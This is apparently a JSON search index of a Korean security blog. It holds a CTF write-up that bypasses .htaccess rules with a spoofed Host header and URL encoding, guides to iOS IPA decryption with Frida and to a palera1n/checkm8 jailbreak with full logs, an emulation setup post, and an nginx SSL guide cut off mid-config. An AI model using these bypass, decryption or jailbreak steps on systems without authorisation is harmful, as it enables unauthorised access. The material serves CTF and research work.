[
  
  {
    "title": "[Urmia CTF 2023] htaccess(helicoptering) writeup",
    "url": "/posts/urmia-ctf-htaccess/",
    "categories": "WEB",
    "tags": "ctf, web, apache",
    "date": "2023-09-03 11:01:00 +0900",
    





    
    "snippet": "solve두개의 .htaccess 를 우회하면 flag를 획득할 수 있다.$ curl http://htaccess.uctf.ir/one/flag.txt&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/ti...",
    "content": "solve두개의 .htaccess 를 우회하면 flag를 획득할 수 있다.$ curl http://htaccess.uctf.ir/one/flag.txt&lt;!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\"&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Forbidden&lt;/h1&gt;&lt;p&gt;You don't have permission to access this resource.&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;만약 우회하지 않고 접근한다면 403을 반환한다.RewriteEngine OnRewriteCond %{HTTP_HOST} !^localhost$RewriteRule \".*\" \"-\" [F]첫 번째 .htaccess 는 HTTP_HOST가 localhost인지 확인한다.$ curl -H 'Host: localhost' http://htaccess.uctf.ir/one/flag.txtuctf{Sule_%요청할 때 헤더에 Host를 바꿔주면 통과된다.RewriteEngine OnRewriteCond %{THE_REQUEST} flagRewriteRule \".*\" \"-\" [F]두 번째 .htaccess 는 THE_REQUEST 변수에 flag가 존재하는지 검사한다.THE_REQUEST    The full HTTP request line sent by the browser to the server (e.g., \"GET /index.html HTTP/1.1\"). This does not include any additional headers sent by the browser. This value has not been unescaped (decoded), unlike most other variables below.documentation에 의하면 request path 부분(GET /path HTTP/1.1)이 THE_REQUEST 변수에 해당하는 것으로 보인다. 또한, decoded text라고 하니, flag 부분을 url encode 해주면 될 것 같다.$ curl http://htaccess.uctf.ir/two/%66lag.txtDukol_waterfall}%f 부분만 %66으로 바꿔서 요청해주면 나머지 플래그를 획득할 수 있다.uctf{Sule_Dukol_waterfall}ref.apache documentation"
  },
  
  {
    "title": "[MacOS] Apple Silicon 맥북에서 amd64 사용하기(UTM)",
    "url": "/posts/use-amd64-on-apple-silicon/",
    "categories": "PWNABLE",
    "tags": "macos, qemu, utm",
    "date": "2023-08-01 01:01:00 +0900",
    





    
    "snippet": "Why?  많은 보안인들이 알고 있듯이 Apple Silicon은 포너블을 하기에 참 적합하지가 않다. 업무를 보다보면 필히 x86 바이너리를 다뤄야 하는데, Apple Silicon은 ARM 구조를 사용하고 있기 때문에 제약이 생긴다. 이에 대한 해결 방안으로 amd64 ubuntu 도커를 받고 여기에 분석 도구를 세팅하는 사용자가 많다. 하지만 이...",
    "content": "Why?  많은 보안인들이 알고 있듯이 Apple Silicon은 포너블을 하기에 참 적합하지가 않다. 업무를 보다보면 필히 x86 바이너리를 다뤄야 하는데, Apple Silicon은 ARM 구조를 사용하고 있기 때문에 제약이 생긴다. 이에 대한 해결 방안으로 amd64 ubuntu 도커를 받고 여기에 분석 도구를 세팅하는 사용자가 많다. 하지만 이 방법은 pwndbg가 동작하지 않는 등 아직까지는 완전히 amd64를 대체할 만한 수단은 아닌 것 같다. 이 때문에 조금 무겁더라도 UTM을 이용하여 amd64 ubuntu 환경을 구축하고자 한다.UTM 설치      UTM은 QEMU 기반의 에뮬레이터이다. iOS, MacOS 에서 다른 OS를 full system emulation 할 수 있다.        설치는 깃허브 에서 UTM.dmg를 받아서 진행할 수 있다.        설치 후에는 아래와 같은 화면을 볼 수 있다.  새 가상머신 만들기  본 글에서는 Ubuntu 22.04 Server(CLI)를 설치할 것이다.  Ubuntu 22.04의 iso 파일을 다운로드 받으면 된다. AMD64로 받아주면 된다. (다운로드)  UTM에서 “새 가상머신 만들기” 를 선택하면 Virtualize와 Emulate 두가지 옵션이 있다. Virtualize는 Parallels, VMWare와 같이 가상머신을 가상화 하는것으로, 호스트의 CPU 아키텍처만 사용할 수 있다. 이와 반대로 Emulate는 네이티브 CPU 아키텍처가 아닌 다른 것들을 사용할 수 있다. 그 대신 CPU 그 자체를 에뮬레이팅 하는 것이기 때문에 속도가 느릴 수 있다. 본 글의 경우 느리더라도 amd64를 네이티브 처럼 사용하는 것이 목적이기 때문에 Emulate를 선택한다.  그 다음으로 운영체제는 Linux를 선택한다. 그 다음 화면에서 “탐색” 을 눌러 방금 다운로드 받은 ISO 파일의 경로를 선택해준다.  아키텍처와 메모리, CPU 코어 수를 선택해준다. 아키텍처는 x86_64로 하고, 메모리와 CPU는 본인 사양을 고려하여 적절히 조절한다. 저장 공간도 마찬가지이다.  공유 폴더는 선택사항이나, 본 글에서는 ~/utm 디렉토리를 만들고 공유 폴더로 지정하였다. 바이너리를 옮기거나 할때 일일히 SCP를 쓴다거나 하면 불편하기 때문에 웬만하면 설정해주자.  가상 머신 이름을 설정해준다.  최종적으로 다음과 같은 화면이 나오게 되는데, 이 이후는 그냥 Ubuntu 설치하듯이 설치하면 된다.  설치가 완료되면 CD/DVD를 초기화 한 후 실행한다. 익숙한 Ubuntu를 확인할 수 있다. SSH 등 편한 방법으로 접근하여 사용하면 된다.  아키텍처를 확인해보면 x86_64인 것을 알 수 있다.제약 사항이 있는지 확인해보기  다른 가상화 프로그램을 이용하면 pwndbg가 되지 않았는데, 정상적으로 동작하고 x86 바이너리도 잘 실행 되는 것을 확인할 수 있다.Ref.https://dev.to/ruanbekker/how-to-run-a-amd64-bit-linux-vm-on-a-mac-m1-51cp"
  },
  
  {
    "title": "[iOS] iOS-Encrypted 된 IPA 복호화하기",
    "url": "/posts/ios-ipa-dump-frida/",
    "categories": "MOBILE, IOS",
    "tags": "mobile, ios, firda",
    "date": "2023-03-04 01:03:00 +0900",
    





    
    "snippet": "Why?  최근 맡은 프로젝트에서 iOS 애플리케이션을 분석할 일이 생겼다. 점점 하다보니 왜 애플이 자기네들 제품/솔루션에 어마어마한 바운티를 걸었는지 알 것 같다. 그냥 간단한 애플리케이션 추출 과정도 번거롭고 번거롭다… iOS 애플리케이션 패키지인 IPA는 안드로이드 APK와 다르게 바로 추출한 파일을 Decompile 했을 때 분석을 할 수 없...",
    "content": "Why?  최근 맡은 프로젝트에서 iOS 애플리케이션을 분석할 일이 생겼다. 점점 하다보니 왜 애플이 자기네들 제품/솔루션에 어마어마한 바운티를 걸었는지 알 것 같다. 그냥 간단한 애플리케이션 추출 과정도 번거롭고 번거롭다… iOS 애플리케이션 패키지인 IPA는 안드로이드 APK와 다르게 바로 추출한 파일을 Decompile 했을 때 분석을 할 수 없게 Instruction 들을 뭉개놓았다. 이를 해체하는 작업을 해보자.그냥 추출하면?  아쉽게도 탈옥 없이, 덤프 없이, 복호화 없이는 위와 같이 다 뭉개진 바이너리를 던져주는 것을 알 수 있다.  애초에 IDA에서 “이건 iOS Encrypted 되어있는데 갠춘?” 이라고 물어본다.  frida를 이용해서 복호화 된 IPA를 덤프해보자덤프하기0. 사전 작업  frida-ios-dump를 이용하기 위해서는 탈옥과 frida 설치가 선행되어야 한다.1. frida-ios-dump 및 Dependency 설치$ git clone https://github.com/AloneMonkey/frida-ios-dump.git  Git에서 frida-ios-dump를 내려받도록 하자.$ cd frida-ios-dump/$ pip3 install -r requirements.txt  이후 해당 repo를 이용하기 위해 설치해야 되는 python 패키지를 다운로드 받자.2. dump.py 수정User = 'root'Password = 'alpine'Host = 'localhost'Port = 2222KeyFileName = None  dump.py 를 열어보면 위와 같은 코드가 있을 것이다.  이는 iPhone의 SSH 정보를 적는 것이며, 알맞게 수정하도록 하자. (openssh-server가 설치되어 있어야 한다.)3. 덤프할 Package Name 확인  frida-ps -Uai 를 통해 덤프할 패키지의 이름을 확인하도록 하자.4. 덤프하기  python3 dump.py [패키지 명] 을 통해 덤프를 진행해주자.  나의 경우 대상 애플리케이션이 탈옥을 탐지하면 Splash 이미지만 띄워주고 바로 튕기는 솔루션이 걸려있었기 때문에 몇 가지 꼼수를 이용하여 IPA가 메모리에 올라올 때 까지 기다리게 만들었다.  인내심을 가지고 조금 기다려보면 IPA를 현재 디렉토리에 만들어준다.결과는?  아까와 다르게 아주 깔끔하게 Decompile 되는 것을 확인할 수 있다."
  },
  
  {
    "title": "[iOS] iPhone에 Frida 환경 세팅하기",
    "url": "/posts/ios-setting-frida/",
    "categories": "MOBILE, IOS",
    "tags": "mobile, ios, firda",
    "date": "2023-03-04 01:02:00 +0900",
    





    
    "snippet": "Why?  최근 맡은 프로젝트에서 iOS 애플리케이션을 분석할 일이 생겼다. 우열곡절 iOS 탈옥을 완료했고, 이제 frida를 세팅해보려고 한다.분석 환경 구성하기0. iPhone 탈옥하기  아무래도 frida를 사용하려면 탈옥, 루팅이 필요할 것이다. 바로 이전 글에서 iOS 탈옥에 대해 다뤘으니 선행하도록 하자.1. MacBook에 frida-t...",
    "content": "Why?  최근 맡은 프로젝트에서 iOS 애플리케이션을 분석할 일이 생겼다. 우열곡절 iOS 탈옥을 완료했고, 이제 frida를 세팅해보려고 한다.분석 환경 구성하기0. iPhone 탈옥하기  아무래도 frida를 사용하려면 탈옥, 루팅이 필요할 것이다. 바로 이전 글에서 iOS 탈옥에 대해 다뤘으니 선행하도록 하자.1. MacBook에 frida-tools 설치하기  터미널을 열고 pip3 install frida-tools 으로 frida-tools를 설치한다. 이는 frida-ps, frida-trace 등 유용한 도구들을 포함한다.2. iPhone에 frida 설치하기  iPhone이 탈옥되어 있다면 Cydia, Sileo 등 탈옥된 기기의 패키지 관리 애플리케이션이 있을 것이다.  Sileo 의 경우 [하단 네비게이션] &gt; [소스] &gt; [우측 상단 더하기] 에서 소스추가를 통해 frida의 repository인 https://build.frida.re/ 를 추가해줘야 한다.  이제 [하단 내비게이션] &gt; [검색] &gt; [‘Frida’ 검색] 을 통해 Frida를 기기에 설치한다.3. 기기를 MacBook에 연결하고 frida attach  frida-ps -U 로 usb 연결된 장치 프로세스 목록을 출력해보자."
  },
  
  {
    "title": "[iOS] iOS 16.3.1 Jailbreak (on MacOS)",
    "url": "/posts/ios-jailbreak-16/",
    "categories": "MOBILE, IOS",
    "tags": "mobile, ios, jailbreak",
    "date": "2023-03-04 01:01:00 +0900",
    





    
    "snippet": "Why?  최근 맡은 프로젝트에서 iOS 애플리케이션을 분석할 일이 생겼다. APK의 경우 대충 시중에 널려있는 에뮬레이터 가져다가 (어차피 루팅 손쉽게 할 수 있으니깐 버튼 하나로) frida 설치하고 후킹 돌리면서 분석하면 되는데 iOS는 그렇게 간단한 문제가 아니더라. 대충 번개장터에서 아무 휴대폰이나 사서 다운그레이드 한 다음에 탈옥시키면 되는...",
    "content": "Why?  최근 맡은 프로젝트에서 iOS 애플리케이션을 분석할 일이 생겼다. APK의 경우 대충 시중에 널려있는 에뮬레이터 가져다가 (어차피 루팅 손쉽게 할 수 있으니깐 버튼 하나로) frida 설치하고 후킹 돌리면서 분석하면 되는데 iOS는 그렇게 간단한 문제가 아니더라. 대충 번개장터에서 아무 휴대폰이나 사서 다운그레이드 한 다음에 탈옥시키면 되는줄 알았다. 그런데 막상 중고로 산 핸드폰은 최신 업데이트 되어있었고, Sign 없는 버전은 설치 안되는 문제 등등 이리저리 치이다가 그냥 가장 최신인 iOS 16.3 에서 탈옥하는 방법을 택했다.내 기기도 가능할까?개발자에 의하면 A8 부터 A11 칩셋을 사용하는 모델까지 가능하다고 한다. 호환되는 기기 목록은 아래와 같다.  iPhone 6s  iPhone 6s Plus  iPhone SE (2016)  iPhone 7  iPhone 7 Plus  iPhone 8  iPhone 8 Plus  iPhone X  iPad mini 4  iPad Air 2  iPad (5th generation)  iPad (6th generation)  iPad (7th generation)  iPad Pro (9.7”)  iPad Pro (12.9”) (1st generation)  iPad Pro (10.5”)  iPad Pro (12.9”) (2nd generation)  iPod Touch (7th generation)환경탈옥 대상 기기 스펙은 다음과 같다.  기기 : iPhone 8  모델 번호 : A1905(iPhone 8 GMS)  버전 : iOS 16.3.1MacOS 스펙은 다음과 같다.  기기 : MacBook Air(M1, 2020)  모델 번호 : A2337  버전 : macOS Ventura 13.0탈옥 과정1. palera1n 다운로드palera1n github repository 에서 macos-universal 바이너리를 다운로드 받는다.2. 바이너리 권한 부여다운받은 바이너리에 Execute Permission을 부여하도록 하자.$ sudo mv ./palera1n-macos-universal /usr/local/bin/palera1n$ ls -al /usr/local/bin/palera1n-rw-r--r--@ 1 r99bbit  staff  15559360  3  4 00:24 /usr/local/bin/palera1n$ sudo xattr -cr /usr/local/bin/palera1n$ sudo chmod +x /usr/local/bin/palera1n-rwxr-xr-x  1 r99bbit  staff  15559360  3  4 00:24 /usr/local/bin/palera1n3. iPhone을 초기화하기A11 칩셋이 탑재된 기기에서 iOS 16.x 를 사용중일 경우 탈옥을 위해서는 암호를 설정한 적이 없어야 한다. 만약 한번이라도 TouchID, passcode를 적용한 적이 있다면 iPhone에서 설정 &gt; 일반 &gt; 전송 또는 iPhone 재설정 &gt; 모든 콘텐츠 및 설정 지우기를 통해 완전 초기화를 진행해줘야 한다. (작업 진행 전에 iTunes 등으로 iPhone을 백업하도록 하자)iPhone 8 시리즈의 경우 A11 바이오닉 칩셋이 탑재되어 있기 때문에 상기 방법으로 초기화를 진행하였다.4. iPhone을 MacBook에 연결하기iPhone을 초기화 했다면 MacBook에 연결하도록 하자. 이 때 USB A to Lightning을 사용해야 한다. iPhone을 처음 샀을 때 주는 번들 케이블(USB C to Lightning Cable)을 사용할 경우 기기가 DFU 모드로 넘어가지 않는 이슈가 있기 때문이다. checkra1n도 이 이슈에 대해 언급했었다.  알다시피 MacBook에 USB A Type을 연결하려면 별도의 허브가 있어야 한다. 데이터 전송 과정에서 끊겨서 벽돌이 될 위험이나 이런걸 생각해보면 정품 허브를 사용하는 것이 안전해 보인다. 하지만 MacBook C Type 허브는 7-8만원 정도 한다. 아직 프로젝트 시작도 못했는데 돈이 꽤 깨졌다. 참 비싼 작업이다. (케이블 사고, 허브 사고, 기기 사고 ㅎㅎ…)5. exploitiPhone을 MacBook에 연결했다면 터미널을 열고 palera1n 을 실행하여 exploit을 수행하자. 과정은 아래와 같다.  palera1n -v -c -f 를 통해 fakefs를 생성  palera1n -v -f 를 통해 exploit을 수행5.1. fakefs를 생성  우선 fakefs를 생성해야한다. 터미널에 palera1n -v -c -f 를 적어주자. - [03/04/23 03:06:19] &lt;Info&gt;: Waiting for devices - [03/04/23 03:06:19] &lt;Verbose&gt;: Normal mode device connected - [03/04/23 03:06:23] &lt;Verbose&gt;: Normal mode device disconnected - [03/04/23 03:06:29] &lt;Verbose&gt;: Recovery mode device 6869920866910254 connected - [03/04/23 03:06:30] &lt;Info&gt;: Press Enter when ready for DFU mode  그러면 기기를 찾은 뒤(포트에 연결 되어있어야 함) DFU 모드에 진입할 준비가 되면 Enter를 누르라고 나온다.  여기까지 오면 연결된 iPhone이 자동으로 종료된 뒤에 위 그림처럼 리커버리 모드에 진입한다. 이제 Enter를 쳐주면 되는데, DFU에 진입하기 위해 기기 버튼을 눌러줘야 하니 Get ready.. 라는 문구가 나올 때 준비를 해줘야 한다.Hold volume down + side button (0)Hold volume down button (3)  - [03/04/23 03:06:47] &lt;Verbose&gt;: DFU mode device 6869920866910254 connected - [03/04/23 03:06:47] &lt;Info&gt;: Device entered DFU mode successfully - [03/04/23 03:06:47] &lt;Info&gt;: About to execute checkra1n  개발자는 친절하게도 DFU 모드 진입을 준비할 시간을 3초 준다. 3, 2, 1 카운트에 맞춰 DFU 모드에 진입하면 되는데 iPhone 8의 경우 [전원 버튼 + 볼륨 다운] &gt; [볼륨 다운] 을 DFU에 진입할 때 까지 눌러주면 된다. 자세한 내용은 터미널 Log에 찍혀 나온다. (혹은 DFU 진입 방법 검색)      이후 자동으로 Exploit을 위한 PongoOS로 진입하게 되고 가만히 냅두면 위와 같이 fakefs 생성이 진행된다. 5분정도 소요되며, 완료 후 자동으로 기기가 재부팅된다.        full log는 아래와 같다.  # == palera1n-c ==## Made by: Nick Chan, Tom , Mineek, Nebula, llsc12## Thanks to: dora2ios, pythonplayer, tihmstar, nikias# (libimobiledevice), checkra1n team (Siguza, axi0mx, littlelailo# et al.), Procursus Team (Hayden Seay, Cameron Katri, Keto et.al) - [03/04/23 03:06:19] &lt;Info&gt;: Waiting for devices - [03/04/23 03:06:19] &lt;Verbose&gt;: Normal mode device connected - [03/04/23 03:06:19] &lt;Info&gt;: Telling device with udid 876f7ee96ef6832f9cfccfa39db4b0867f219188 to enter recovery mode immediately - [03/04/23 03:06:23] &lt;Verbose&gt;: Normal mode device disconnected - [03/04/23 03:06:29] &lt;Verbose&gt;: Recovery mode device 6869920866910254 connected - [03/04/23 03:06:30] &lt;Info&gt;: Press Enter when ready for DFU modeGet ready (0)Hold volume down + side button (2) - [03/04/23 03:06:38] &lt;Verbose&gt;: Recovery mode device disconnectedHold volume down + side button (0)Hold volume down button (3) - [03/04/23 03:06:47] &lt;Verbose&gt;: DFU mode device 6869920866910254 connected - [03/04/23 03:06:47] &lt;Info&gt;: Device entered DFU mode successfully - [03/04/23 03:06:47] &lt;Info&gt;: About to execute checkra1n## Checkra1n 0.1337.1## Proudly written in nano# (c) 2019-2023 Kim Jong Cracks##========  Made by  =======# argp, axi0mx, danyl931, jaywalker, kirb, littlelailo, nitoTV# never_released, nullpixel, pimskeks, qwertyoruiop, sbingner, siguza#======== Thanks to =======# haifisch, jndok, jonseals, xerub, lilstevie, psychotea, sferrini# Cellebrite (ih8sn0w, cjori, ronyrus et al.)#========================== - [03/04/23 03:06:48] &lt;Verbose&gt;: Starting thread for Apple TV 4K Advanced board - [03/04/23 03:06:48] &lt;Info&gt;: Waiting for DFU mode devices - [03/04/23 03:06:48] &lt;Verbose&gt;: DFU mode device found - [03/04/23 03:06:48] &lt;Info&gt;: Checking if device is ready - [03/04/23 03:06:48] &lt;Verbose&gt;: Attempting to perform checkm8 on 8015 11 - [03/04/23 03:06:48] &lt;Info&gt;: Setting up the exploit - [03/04/23 03:06:48] &lt;Verbose&gt;: == checkm8 setup stage == - [03/04/23 03:06:48] &lt;Verbose&gt;: Entered initial checkm8 state after 1 steps - [03/04/23 03:06:48] &lt;Verbose&gt;: Stalled input endpoint after 1 steps - [03/04/23 03:06:48] &lt;Verbose&gt;: DFU mode device disconnected - [03/04/23 03:06:48] &lt;Verbose&gt;: DFU mode device found - [03/04/23 03:06:48] &lt;Verbose&gt;: == checkm8 trigger stage == - [03/04/23 03:06:51] &lt;Info&gt;: Checkmate! - [03/04/23 03:06:51] &lt;Verbose&gt;: Device should now reconnect in download mode - [03/04/23 03:06:51] &lt;Verbose&gt;: DFU mode device disconnected - [03/04/23 03:06:57] &lt;Info&gt;: Entered download mode - [03/04/23 03:06:57] &lt;Verbose&gt;: Download mode device found - [03/04/23 03:06:57] &lt;Info&gt;: Booting PongoOS... - [03/04/23 03:06:59] &lt;Info&gt;: Found PongoOS USB Device - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'fuse lock' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'sep auto' - [03/04/23 03:06:59] &lt;Verbose&gt;: Uploaded 115504 bytes to PongoOS - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'modload' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'kpf_flags 0x1' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'checkra1n_flags 0x0' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'palera1n_flags 0x5' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'rootfs' - [03/04/23 03:06:59] &lt;Verbose&gt;: Uploaded 524288 bytes to PongoOS - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'ramdisk' - [03/04/23 03:06:59] &lt;Verbose&gt;: Uploaded 5821922 bytes to PongoOS - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'overlay' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'xargs  wdt=-1 rootdev=md0' - [03/04/23 03:06:59] &lt;Verbose&gt;: Executing PongoOS command: 'bootx' - [03/04/23 03:06:59] &lt;Info&gt;: Booting Kernel...5.2. 탈옥을 진행  여기까지 잘 따라왔으면 iPhone이 별 다른 문제 없이 바탕화면을 보여주고 있을 것이다.  이번엔 터미널에 palera1n -v -f 를 적어주자. 아까와 다른점은 fakefs를 생성해주는 옵션인 -c 가 빠졌다.  리커버리 진입, DFU 진입 등 과정은 5.1. 과 동일하게 진행하면 된다.6. 기기에서 palera1n 앱 실행 및 설치 작업  정상적으로 설치 되었다면 홈 화면에 위와 같이 “palera1n” 애플리케이션이 설치 되어있을 것이다.  “palera1n” 을 실행하고 “install”  “Respring” 을 클릭하여 탈옥을 마무리7. 축하합니다! 탈옥 성공~!!  탈옥이 정상적으로 완료되었다.  홈 화면에 생성된 “Sileo” 애플리케이션을 통해 다양한 Tweak을 설치해볼 수 있다.8. 주의할 점 한가지  앞서 A11 칩셋 이후 모델은 TouchID나 passcode가 한번이라도 설정 되었다면 안된다고 언급했었다.  이는 탈옥 이후에도 마찬가지다. 암호설정 절대절대 금지이다Trouble Shooting1. DFU 진입이 안된다.  이는 앞서 언급한 케이블 문제일 가능성이 크며 C to Lightning 즉, 기기 구매시 번들로 오는 케이블을 이용했을 때 DFU에 진입하지 못할 수 있다. 이는 해당 레포지토리 README 에서도 언급한 바 있다.          The BootROM will only enter DFU if it detects USB voltage, which boils down to checking whether a certain pin is asserted from the Tristar chip. The Tristar does this based on the cable’s accessory ID, and apparently USB-A and USB-C cables have different accessory IDs, and the one of the USB-C cables makes the Tristar not assert the USB voltage pin.      2. PongoOS 진입 후 특정 로그만 계속 뜨고 재부팅이 안된다.  위와 같은 문구가 계속 뜨면서 재부팅이 안된다면 다음과 같은 두개의 문제를 의심해볼 수 있다.  첫째, 사용하고 있는 케이블이 문제 일 수 있다. 실제로 정품 케이블로 바꾸자 귀신같이 해결되었다.  둘째, fakefs 생성 과정에서 문제가 있을 수 있다. 나의 경우 create fakefs 할 때 모종의 이유로 -c 옵션이 아닌, -B 옵션을 사용 했었는데(bindfs) 이는 iOS 16에서는 더이상 제대로 동작하지 않는 기능이기 때문에 벽돌이 됐었다.3. 이외의 문제들..  README에서 확인해볼 수 있는 “탈옥이 실패할 수 있는 케이스” 들을 살펴보면          AMD CPU에서는 USB 컨트롤러 문제(아마도) 때문에 익스에 실패할 수 있으니 INTEL이나 MACOS에서 시도해라      해당 익스는 A8 에서 A11 칩셋까지 가능함      (앞서 기술한) USB C 타입 케이블 사용      4. 탈옥에 실패한다면?  탈옥에 실패하면 palera1n --force-revert -f 를 실행하여 fakefs 제거한 뒤 다시 시도  DFU 등에서 핸드폰이 멈추면 강제 재부팅(볼륨 업 &gt; 볼륨 다운 &gt; 전원 길게 누르기) 해보기Reference  참고 링크  palera1n"
  },
  
  {
    "title": "[Docker] Nginx를 이용해서 SSL 설정하기(HTTPS)",
    "url": "/posts/docker-nginx-proxy-ssl/",
    "categories": "DOCKER",
    "tags": "docker, nginx, proxy, https, ssl",
    "date": "2023-02-01 00:56:01 +0900",
    





    
    "snippet": "Why?  최근에 브라우저와 내 서버 간의 HTTP 통신을 다뤄야 하는 일이 있었다. 이 때 브라우저로 접속한 서버는 HTTPS, 내가 구현한 서버는 HTTP 였기 때문에 당연하게도 Mixed Contents 문제가 발생했다. 문제를 해결하기 위해 내 서버에 SSL 인증을 넣어주기로 했다. 서버에 SSL 인증을 받는 방법에는 여러가지가 있지만, 매번 ...",
    "content": "Why?  최근에 브라우저와 내 서버 간의 HTTP 통신을 다뤄야 하는 일이 있었다. 이 때 브라우저로 접속한 서버는 HTTPS, 내가 구현한 서버는 HTTP 였기 때문에 당연하게도 Mixed Contents 문제가 발생했다. 문제를 해결하기 위해 내 서버에 SSL 인증을 넣어주기로 했다. 서버에 SSL 인증을 받는 방법에는 여러가지가 있지만, 매번 프레임워크 별 HTTPS 적용 방법을 검색하는 것이 지쳤기 때문에 항상 눈독들여 왔던 “nginx reverse proxy로 ssl 인증 적용하기(무려 docker로!)” 를 시도해보려고 한다.  +) 금방 구현할 수 있을 줄 알았는데 생각보다 많은 시간이 걸렸다. 관련 글들은 많으나 어딘가 난잡했고, 여기저기서 config 내용을 복붙하다보니 설정이 꼬여서 삽질을 조금 했다.. 이 글을 통해 “docker + nginx + reverse proxy + ssl” 이 필요한 사람들에게 문제를 해결하는 힌트가 되었으면 하는 바램이다.Proxy Server?proxy server는 클라이언트와 접속하고자 하는 서버 사이에 중계(proxy) 역할을 수행하는 것을 말한다. 간단하게 말하자면 클라이언트와 서버 통신 사이에 징검다리가 하나 생긴 것이다. 일반적으로 Proxy에는 Forward Proxy와 Reverse Proxy가 존재한다.Forward Proxy클라이언트가 proxy server 에 외부 자산에 접근을 요청하면 proxy server 가 클라이언트를 대신하여 인터넷에 접속한 후 결과를 전달해준다. 웹 사이트 취약점 점검시 이용하는 Burp Suite 나 Paros 등의 도구가 이에 해당한다.Reverse ProxyForward Proxy 에서 proxy server가 클라이언트의 역할을 대신 하였다면, Reverse Proxy 에서는 서버의 역할을 대신하는 것이라고 할 수 있다. 클라이언트&lt;-&gt;프록시서버&lt;-&gt;내부서버 와 같은 구조로 되어있을 때 클라이언트가 proxy server에 접근을 요청하면 proxy server 가 다시 내부 서버에 데이터를 요청하여 클라이언트에게 결과를 전달해준다.이렇게 되면 사용자는 내부 서버에 직접 접근할 수 없기 때문에 서버를 더 안전하게 운영할 수 있다. 또한, 사용자가 굳이 내부 서버의 아이피를 몰라도 되며, 여러 제품을 각기 다른 서버에서 운영하고 있을 때 외부로 노출시키는 포트를 하나만 사용하더라도 reverse proxy가 사용자의 요청에 따라 마치 라우팅 하듯이 사용할 수 있어 효과적인 토폴로지를 구성할 수 있다.목표  내 경우 현재 개발중인 Flask 서버 앞단에 Reverse Proxy를 붙여서 해당 도메인을 접속했을 때 HTTPS가 적용되도록 할 것이다.  개발중인 애플리케이션이 꼭 Flask가 아니여도 가능하니 참고Nginx Docker를 이용해서 SSL 설정하기  환경 : Ubuntu 22.04 LTS  docker, docker-compose가 설치 되어있다고 가정  참고한 링크  계획          본인의 상황에 맞게 docker-compose.yml 파일을 작성한다.      nginx.conf 파일을 작성한다.      certbot으로 nginx를 자동으로 ssl 인증해주는 스크립트를 돌린다.      0. 디렉토리 만들기우선 작업할 디렉토리를 하나 파도록 하자. 우선은 이런식으로 구조가 된다는 것만 인지하도록 하자..├── app # 이건 내 Flask 서버이다. 상황에 맞게 본인의 애플리케이션을 위치시키자│   ├── Dockerfile│   └── src│       └── app.py├── data # data 디렉토리를 만들고 │   └── nginx.conf # 안에 nginx.conf 파일을 만들어주자├── docker-compose.yml # 바로 뒤에 작성할 docker-compose.yml 파일이다.└── init-letsencrypt.sh # 이건 지금 신경쓰지 말고 뒤에 스크립트 나오는거 복붙하면 된다.1. docker-compose.yml 작성하기version: '3'services:  your-application:    # 이 부분에 본인의 애플리케이션 config를 넣도록 하자.  nginx:    image: nginx:1.18-alpine    ports:      - \"80:80\"      - \"443:443\"    volumes:      - ./data/nginx.conf:/etc/nginx/nginx.conf      - ./data/nginx:/etc/nginx/conf.d      - ./data/certbot/conf:/etc/letsencrypt      - ./data/certbot/www:/var/www/certbot    command: \"/bin/sh -c 'while :; do sleep 6h &amp; wait $${!}; nginx -s reload; done &amp; nginx -g \\\"daemon off;\\\"'\"    depends_on:      - your-application  certbot:    image: certbot/certbot    volumes:      - ./data/certbot/conf:/etc/letsencrypt      - ./data/certbot/www:/var/www/certbot    entrypoint: \"/bin/sh -c 'trap exit TERM; while :; do certbot renew; sleep 12h &amp; wait $${!}; done;'\"작성해야 하는 docker-compose 파일은 위와 같다. 다른건 건들지 말고 your-application 이라고 해놓은 부분만 본인의 상황에 맞게 수정하면 된다. 간단하게 설명하자면  nginx          image : nginx 기본 이미지를 사용할 것이다.      ports : HTTP(80)와 HTTPS(443)를 열어놓을 것이다. 추후 80으로 들어오는건 HTTPS로 Redirect 하는 설정을 할 것이다.      volumes : nginx에 ssl 인증을 할것인데, 기본적으로 host에서 ssl 인증을 하고 그 파일을 docker container 내부로 volume share 해 줄 것이다.      command : 인증서 갱신용        certbot          image : letsencrypt에서 친절하게도 인증 컨테이너를 push 해주셨다.      entrypoint : 인증서 갱신용      2. data/nginx.conf 작성하기docker-compose.yml 작성을 완료했으면 같은 디렉토리에 data/ 디렉토리를 생성하고 그 안에 nginx.conf 를 작성한다. 기본 틀은 아래와 같은데, 주석으로 표시한 부분을 본인에 맞게 변경하도록 하자(도메인 및 proxy alias)여기서 29번 라인에 URL에는 docker-compose.yml 에 작성한 본인의 애플리케이션 container name을 적어주면 된다. (예시는 your-application)worker_processes auto;error_log /var/log/nginx/error.log warn;pid /var/run/nginx.pid;events {\tworker_connections 1024;}http {\tinclude mime.types;\tserver {\t\tlisten 80;\t\tserver_name your.domain.com; # modify required!!!\t\tlocation /.well-known/acme-challenge/ {\t\t\troot /var/www/certbot;\t\t}\t\tlocation / {\t\t\treturn 301 https://$host$request_uri;\t\t}    \t}\tserver {\t\tlisten 443 ssl;\t\tserver_name your.domain.com; # modify required!!!\t\t\t\tlocation / {\t\t\tproxy_pass http://your-application:8080/; # modify required!!! &amp; check your application port\t\t}\t\tssl_certificate /etc/letsencrypt/live/your.domain.com/fullchain.pem; # modify required!!!\t\tssl_certificate_key /etc/letsencrypt/your.domain.com/privkey.pem; # modify required!!!\t\tinclude /etc/letsencrypt/options-ssl-nginx.conf;\t\tssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\t}\tlog_format main 